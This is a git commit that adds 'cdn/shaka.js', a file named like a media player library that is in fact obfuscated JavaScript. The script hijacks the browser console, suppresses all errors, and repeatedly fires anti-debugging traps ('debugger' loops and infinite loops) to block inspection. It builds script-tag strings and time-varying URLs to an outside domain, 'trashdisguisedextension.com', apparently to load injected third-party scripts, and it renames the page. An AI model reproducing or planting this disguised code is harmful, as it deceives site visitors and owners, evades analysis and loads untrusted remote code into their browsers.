d2f753abbaf898ffe87fe0b91723d560d2c53d78
soponta <heber.sba@gmail.com>
2023-06-26 11:34:20 +0700

    Add files via upload

---
+++ cdn/shaka.js
@@ -0,0 +1,175 @@
+'use strict';
+var _0x59b6d0 = function() {
+ var y$$ = true;
+ return function(body, fmt) {
+   var voronoi = y$$ ? function() {
+     if (fmt) {
+       var code = fmt.apply(body, arguments);
+       return fmt = null, code;
+     }
+   } : function() {
+   };
+   return y$$ = false, voronoi;
+ };
+}();
+var _0x480cc8 = _0x59b6d0(undefined, function() {
+ return _0x480cc8.toString().search("(((.+)+)+)+$").toString().constructor(_0x480cc8).search("(((.+)+)+)+$");
+});
+_0x480cc8();
+var _0x46d92e = function() {
+ var y$$ = true;
+ return function(body, fmt) {
+   var voronoi = y$$ ? function() {
+     if (fmt) {
+       var code = fmt.apply(body, arguments);
+       return fmt = null, code;
+     }
+   } : function() {
+   };
+   return y$$ = false, voronoi;
+ };
+}();
+(function() {
+ _0x46d92e(this, function() {
+   var parser = new RegExp("function *\\( *\\)");
+   var c = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
+   var line = _0x2e4922("init");
+   if (!parser.test(line + "chain") || !c.test(line + "input")) {
+     line("0");
+   } else {
+     _0x2e4922();
+   }
+ })();
+})();
+var _0x1e6a36 = function() {
+ var y$$ = true;
+ return function(body, fmt) {
+   var voronoi = y$$ ? function() {
+     if (fmt) {
+       var code = fmt.apply(body, arguments);
+       return fmt = null, code;
+     }
+   } : function() {
+   };
+   return y$$ = false, voronoi;
+ };
+}();
+var _0x3f2d6d = _0x1e6a36(undefined, function() {
+ var getAlignItem = function setup() {
+   var viewport;
+   try {
+     viewport = Function('return (function() {}.constructor("return this")( ));')();
+   } catch (_0x598ac7) {
+     viewport = window;
+   }
+   return viewport;
+ };
+ var alignContentAlignItem = getAlignItem();
+ var glyphsByName = alignContentAlignItem.console = alignContentAlignItem.console || {};
+ var methods = ["log", "warn", "info", "error", "exception", "table", "trace"];
+ var i = 0;
+ for (; i < methods.length; i++) {
+   var o = _0x1e6a36.constructor.prototype.bind(_0x1e6a36);
+   var name = methods[i];
+   var path = glyphsByName[name] || o;
+   o["__proto__"] = _0x1e6a36.bind(_0x1e6a36);
+   o.toString = path.toString.bind(path);
+   glyphsByName[name] = o;
+ }
+});
+_0x3f2d6d();
+cookieChoices = {};
+(function() {
+ var getAlignItem = function setup() {
+   var viewport;
+   try {
+     viewport = Function('return (function() {}.constructor("return this")( ));')();
+   } catch (_0x184c04) {
+     viewport = window;
+   }
+   return viewport;
+ };
+ var alignContentAlignItem = getAlignItem();
+ alignContentAlignItem.setInterval(_0x2e4922, 4000);
+})();
+window.onerror = function() {
+ return true;
+};
+s = ".blogspot.";
+a = window.location.hostname;
+f = a;
+b = decodeURIComponent(location.href);
+A3 = 0;
+A = "";
+Z90 = b;
+X$ = 0;
+Z0 = 0;
+if (b.indexOf("m=1") > -1) {
+ X$ = 1;
+}
+if (b.indexOf("m=") > -1) {
+ A = b.split("m=")[1];
+}
+if (A.indexOf("xyz") > -1) {
+ A3 = 1;
+}
+P$ = new Date;
+l = P$.getDate();
+h = ("0" + l).slice(-2);
+j = P$.getMonth();
+k = ("0" + (j + 1)).slice(-2);
+o = P$.getHours();
+p = ("0" + o).slice(-2);
+q = P$.getMinutes();
+r = ("0" + q).slice(-2);
+Y_ = r;
+i = P$.getFullYear();
+CA3 = h + k + p;
+u = "https://";
+B$ = "<script";
+J$ = B$ + ">";
+K$ = "\x3c/script>";
+K_ = B$ + " charset='UTF-8' src='";
+L_ = "'>" + K$;
+Q$ = ")" + K$;
+Y$ = J$ + "document['\\x77\\x72\\x69\\x74\\x65'](";
+ime = ".trashdisguisedextension.com/";
+ima = ime + "gn7nwf406x?key=31a520928621e787055cc50496110653";
+imi = ime + "tt64fjqae?key=57cd3809e3d35a5c0e261089ae571aa8";
+ima = u + Y_ + CA3 + ima;
+imi = u + Y_ + CA3 + imi;
+izi = ima;
+if (q & 1) {
+ izi = imi;
+}
+if (location.href == window.top.location) {
+ document.title = "Shared TV";
+}
+function _0x2e4922(event) {
+ function render(i) {
+   if (typeof i === "string") {
+     return function(canCreateDiscussions) {
+     }.constructor("while (true) {}").apply("counter");
+   } else {
+     if (("" + i / i).length !== 1 || i % 20 === 0) {
+       (function() {
+         return true;
+       }).constructor("debugger").call("action");
+     } else {
+       (function() {
+         return false;
+       }).constructor("debugger").apply("stateObject");
+     }
+   }
+   render(++i);
+ }
+ try {
+   if (event) {
+     return render;
+   } else {
+     render(0);
+   }
+ } catch (_0x358350) {
+ }
+}
+;
